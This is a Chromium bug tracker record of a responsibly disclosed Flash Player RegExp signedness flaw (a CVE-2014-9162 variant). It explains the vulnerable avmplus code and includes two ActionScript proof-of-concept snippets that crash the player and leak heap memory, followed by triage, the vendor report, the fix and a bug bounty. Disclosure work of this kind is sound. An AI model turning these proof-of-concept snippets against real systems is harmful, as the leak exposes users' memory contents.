# Security: Flash Player RegExp Object Integer Signedness Error

| Field | Value |
|-------|-------|
| **Issue ID** | [40081021](https://issues.chromium.org/issues/40081021) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals>Plugins>Flash |
| **CVE IDs** | CVE-2014-9162 |
| **Reporter** | ya...@gmail.com |
| **Assignee** | [Deleted User] |
| **Created** | 2014-12-16 |
| **Bounty** | $4,000.00 |

## Description

**VULNERABILITY DETAILS**  

According to the public avmplus source, this bug is related to the following code:

(avmplus/core/RegExpObject.cpp)  

412 /\* nameTable is a series of fixed length entries (entrySize)  

413 the first two bytes are the index into the ovector and the result  

414 is a null terminated string (the subgroup name) \*/  

415 for (int i = 0; i < nameCount; i++)  

416 {  

417 int nameIndex, length;  

418 nameIndex = (nameTable[0] << 8) + nameTable[1];  

419 length = ovector[nameIndex \* 2 + 1] - ovector[ nameIndex \* 2 ];  

420  

421 Atom name = stringFromUTF8((nameTable+2), (uint32\_t)VMPI\_strlen(nameTable+2));  

422 name = core->internString(name)->atom();  

423  

424 Atom value = stringFromUTF8(utf8Subject.c\_str()+ovector[nameIndex\*2], length);  

425  

426 a->setAtomProperty(name, value);  

427  

428 nameTable += entrySize;  

429 }

Here the variable nameIndex is calculated by combining two bytes, whose value is controlled by the number of capturing groups in the regexp pattern. Note the type of nameIndex is signed int and nameTable is of type char \*, so the corresponding assembly code performs sign extension to nameTable[1] before adding it to (nameTable[0] << 8). Now if nameTable[1] has the most significant bit set, this sign extension will cause nameIndex to become a negative number, and make the ovector array access in the next statement out-of-bound.

**VERSION**  

Chrome 39.0.2171.95 (64-bit) stable + Adobe Flash Player 16.0.0.235 / Windows 7

**REPRODUCTION CASE**  

package  

{  

import flash.display.Sprite;

```
public class Main extends Sprite  
{  
	public function Main():void  
	{  
		for (var i:int = 0; i < 2048; i++)  
			new RegExp("(?P<NameA>)()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()(?P<NameB>)").exec("AAA");  
	}  
}  

```

}

## Attachments

- [crasher_integer.swf](attachments/crasher_integer.swf) (application/octet-stream, 827 B)
- [Main.as](attachments/Main.as) (application/octet-stream, 1.2 KB)
- [Main.swf](attachments/Main.swf) (application/octet-stream, 928 B)
- [Main_x64.as](attachments/Main_x64.as) (application/octet-stream, 1.3 KB)
- [str_dump_x64.swf](attachments/str_dump_x64.swf) (application/octet-stream, 1.3 KB)
- [Main_win32.as](attachments/Main_win32.as) (application/octet-stream, 1.4 KB)
- [str_dump_win32.swf](attachments/str_dump_win32.swf) (application/octet-stream, 1.3 KB)

## Timeline

### ya...@gmail.com (2014-12-16)

There is also an out-of-bound read issue in line 419 of the code shown above. Flash player binary seems to have fixed this issue by adding a check to see if the value is greater than 0x31, but this check doesn't account for the negative case, leading to the bug reported.


### ya...@gmail.com (2014-12-16)

This bug can be leveraged to leak heap memory contents after the space allocated for the string to be matched. For example, the following ActionScript code will print such data in a trace message. It works reliably with standalone flash player debuggers of version 10.3.183.15, 14.0.0.145 and 15.0.0.152.

package
{
	import flash.display.Sprite;

	public class Main extends Sprite
	{
		public function Main():void
		{
			var regexp:RegExp = new RegExp("(?P<NameA>)()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()()(?P<NameB>)");
			var result:Object = regexp.exec("AAA");
			trace(result["NameB"].length + ": " + result["NameB"]);
		}
	}
}


### in...@chromium.org (2014-12-16)

[Empty comment from Monorail migration]

### ts...@chromium.org (2014-12-16)

[Empty comment from Monorail migration]

### cl...@chromium.org (2014-12-16)

[Empty comment from Monorail migration]

### sc...@gmail.com (2014-12-17)

[Empty comment from Monorail migration]

### sc...@gmail.com (2014-12-17)

Another great report, Yang!

Some notes and questions:

1) Could you make a repro that visibly leaks (i.e. with on-screen text instead of trace()) the out-of-bounds content? And make it against the latest Chrome version (Flash v16.x.x.x / Chrome M39 latest patch?) This will really help the rewards panel.

2) I'd guess that the added check you reference in https://crbug.com/chromium/442585#c1 might be the fix for CVE-2014-9162, in the Flash v16.0.0.235 patch: http://helpx.adobe.com/security/products/flash-player/apsb14-27.html
So thank you for finding a variation! Variations like this are often uncovered by bad actors so it's great that you reported it first.

### ma...@google.com (2014-12-17)

Verified and reported to Adobe.

See attachment for a compiled swf that will print leaked data to the browser console. Tested on the latest x64 chrome linux build w. Flash v16.0.0.235.

### ya...@gmail.com (2014-12-18)

Thank you Mark. I've also developed two PoCs for both 32-bit and 64-bit pepper flash on Windows, as attached below. The only difference between them is the number of parentheses in the regexp, which deals with specific stack data layouts on each platform. It's interesting to note that code generated for pepper flash is quite different from vanilla flash player released by Adobe. It takes a bit time to locate the relevant instruction, but everything else goes just fine :-)


### ma...@google.com (2014-12-18)

Adobe acknowledged with ID PSIRT-3190.

### cl...@chromium.org (2015-01-01)

cevans@: Uh oh! This issue is still open and hasn't been updated in the last 14 days. Since this is a serious security vulnerability, we want to make sure progress is happening. Can you update the bug with current status, and what, if anything, is blocking?

If you are not the right Owner for this bug, please find someone else to own it as soon as possible and remove yourself as Owner.

If the issue is already fixed or you are to unable to reproduce it, please close the bug. (And thanks for fixing the bug!).

These nags can be disabled by adding a 'WIP' label and an optional codereview link.

- Your friendly ClusterFuzz

### in...@chromium.org (2015-01-07)

[Empty comment from Monorail migration]

### in...@chromium.org (2015-01-07)

[Empty comment from Monorail migration]

### in...@chromium.org (2015-01-07)

[Empty comment from Monorail migration]

### sc...@gmail.com (2015-01-18)

[Empty comment from Monorail migration]

### sc...@gmail.com (2015-01-22)

The fix for this shipped in Chrome 40: http://googlechromereleases.blogspot.com/2015/01/stable-update.html
Formal Adobe advisory to appear shortly.

### cl...@chromium.org (2015-01-22)

Adding Merge-Triage label for tracking purposes.

Once your fix had sufficient bake time (on canary, dev as appropriate), please nominate your fix for merge by adding the Merge-Requested label.

When your merge is approved by the release manager, please start merging with higher milestone label first. Make sure to re-request merge for every milestone in the label list. You can get branch information on omahaproxy.appspot.com.

- Your friendly ClusterFuzz

### ti...@google.com (2015-01-22)

Thanks again Yang - $4000 for this report. ($3000 for the bug, +$1000 for the great PoCs).

### in...@chromium.org (2015-01-25)

[Empty comment from Monorail migration]

### ti...@google.com (2015-03-06)

[Empty comment from Monorail migration]

### cl...@chromium.org (2015-04-30)

Bulk update: removing view restriction from closed bugs.

### ti...@google.com (2015-06-25)

Processing via our e-payment system can take up to two weeks, but the reward should be on its way to you. Thanks again for your help!

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/442585?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40081021)*
